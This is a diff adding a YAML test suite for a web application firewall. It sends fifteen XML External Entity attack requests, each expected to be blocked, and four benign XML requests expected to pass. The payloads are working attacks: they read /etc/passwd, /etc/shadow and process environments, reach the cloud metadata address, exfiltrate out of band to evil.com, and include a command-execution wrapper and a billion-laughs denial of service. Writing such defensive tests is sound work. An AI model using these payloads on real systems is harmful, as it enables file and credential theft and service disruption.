@@ -1,0 +1,255 @@
+meta:
+  category: "XML External Entities"
+  subcategory: "XXE"
+  owasp: "A05:2021, WSTG-INPV-07"
+  severity: "high"
+
+tests:
+  - id: "xxe-001"
+    title: "Basic XXE - file read"
+    tags: ["xxe", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/xml"
+      headers:
+        Content-Type: "application/xml"
+      body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xxe-002"
+    title: "XXE - /etc/shadow read"
+    tags: ["xxe", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/xml"
+      headers:
+        Content-Type: "application/xml"
+      body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root>&xxe;</root>'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xxe-003"
+    title: "XXE - SSRF via HTTP"
+    tags: ["xxe", "ssrf", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/xml"
+      headers:
+        Content-Type: "application/xml"
+      body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xxe-004"
+    title: "Blind XXE - out-of-band exfiltration"
+    tags: ["xxe", "blind", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/xml"
+      headers:
+        Content-Type: "application/xml"
+      body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><root>test</root>'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xxe-005"
+    title: "XXE - parameter entity"
+    tags: ["xxe", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/xml"
+      headers:
+        Content-Type: "application/xml"
+      body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \"http://evil.com/?x=%file;\">">%eval;%exfil;]><root>test</root>'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xxe-006"
+    title: "XXE - PHP expect wrapper"
+    tags: ["xxe", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/xml"
+      headers:
+        Content-Type: "application/xml"
+      body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><root>&xxe;</root>'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xxe-007"
+    title: "XXE - billion laughs (DoS)"
+    tags: ["xxe", "dos", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/xml"
+      headers:
+        Content-Type: "application/xml"
+      body: '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><root>&lol3;</root>'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xxe-008"
+    title: "XXE via SVG upload"
+    tags: ["xxe", "svg", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/upload"
+      headers:
+        Content-Type: "image/svg+xml"
+      body: '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xxe-009"
+    title: "XXE in SOAP request"
+    tags: ["xxe", "soap", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/soap"
+      headers:
+        Content-Type: "text/xml"
+      body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><data>&xxe;</data></soap:Body></soap:Envelope>'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xxe-010"
+    title: "XXE via XInclude"
+    tags: ["xxe", "xinclude", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/xml"
+      headers:
+        Content-Type: "application/xml"
+      body: '<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></root>'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xxe-011"
+    title: "XXE - UTF-7 encoded"
+    tags: ["xxe", "evasion", "paranoia-2"]
+    request:
+      method: "POST"
+      path: "/api/xml"
+      headers:
+        Content-Type: "application/xml"
+      body: '<?xml version="1.0" encoding="UTF-7"?>+ADw-!DOCTYPE foo +AFs-+ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-+ADw-root+AD4-+ACY-xxe;+ADw-/root+AD4-'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xxe-012"
+    title: "XXE - file:// protocol"
+    tags: ["xxe", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/xml"
+      headers:
+        Content-Type: "application/xml"
+      body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xxe-013"
+    title: "XXE - PHP php://filter"
+    tags: ["xxe", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/xml"
+      headers:
+        Content-Type: "application/xml"
+      body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xxe-014"
+    title: "XXE - FTP out-of-band"
+    tags: ["xxe", "oob", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/xml"
+      headers:
+        Content-Type: "application/xml"
+      body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://evil.com/data">]><root>&xxe;</root>'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xxe-015"
+    title: "XXE - jar protocol (Java)"
+    tags: ["xxe", "java", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/xml"
+      headers:
+        Content-Type: "application/xml"
+      body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://evil.com/evil.jar!/evil.txt">]><root>&xxe;</root>'
+    expected:
+      status: 403
+      action: "block"
+
+  # --- False positives ---
+
+  - id: "xxe-fp-001"
+    title: "False positive - normal XML"
+    tags: ["xxe", "false-positive"]
+    request:
+      method: "POST"
+      path: "/api/xml"
+      headers:
+        Content-Type: "application/xml"
+      body: '<?xml version="1.0"?><root><name>John</name><age>30</age></root>'
+    expected:
+      status: 200
+      action: "allow"
+
+  - id: "xxe-fp-002"
+    title: "False positive - SOAP without entities"
+    tags: ["xxe", "false-positive"]
+    request:
+      method: "POST"
+      path: "/api/soap"
+      headers:
+        Content-Type: "text/xml"
+      body: '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetUser><id>123</id></GetUser></soap:Body></soap:Envelope>'
+    expected:
+      status: 200
+      action: "allow"
+
+  - id: "xxe-fp-003"
+    title: "False positive - SVG without entities"
+    tags: ["xxe", "false-positive"]
+    request:
+      method: "POST"
+      path: "/api/upload"
+      headers:
+        Content-Type: "image/svg+xml"
+      body: '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><circle cx="50" cy="50" r="40" fill="red"/></svg>'
+    expected:
+      status: 200
+      action: "allow"
+
+  - id: "xxe-fp-004"
+    title: "False positive - RSS feed"
+    tags: ["xxe", "false-positive"]
+    request:
+      method: "POST"
+      path: "/api/feed"
+      headers:
+        Content-Type: "application/xml"
+      body: '<?xml version="1.0"?><rss version="2.0"><channel><title>Blog</title><item><title>Post 1</title></item></channel></rss>'
+    expected:
+      status: 200
+      action: "allow"
